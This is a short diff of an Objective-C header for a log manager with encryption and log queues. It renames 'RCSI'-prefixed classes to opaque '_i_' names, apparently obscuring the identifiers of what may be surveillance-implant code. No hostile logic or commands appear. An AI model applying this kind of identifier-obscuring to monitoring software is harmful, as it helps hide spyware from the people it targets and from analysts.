@@ -17,7 +17,7 @@
 #import "NSMutableData+AES128.h"
 
 
-@class RCSIEncryption;
+@class _i_Encryption;
 
 //
 // Basically there are 2 possible queues:
@@ -41,7 +41,7 @@ enum {
 //  - logName
 //  - handle
 
-@interface RCSILogManager : NSObject
+@interface _i_LogManager : NSObject
 {
 @private
   NSMutableArray *mActiveQueue;
@@ -55,12 +55,12 @@ enum {
   NSMachPort     *notificationPort;
   
 @private
-  RCSIEncryption *mEncryption;
+  _i_Encryption *mEncryption;
 }
 
 @property (readonly) NSMachPort *notificationPort;
 
-+ (RCSILogManager *)sharedInstance;
++ (_i_LogManager *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
 - (id)init;
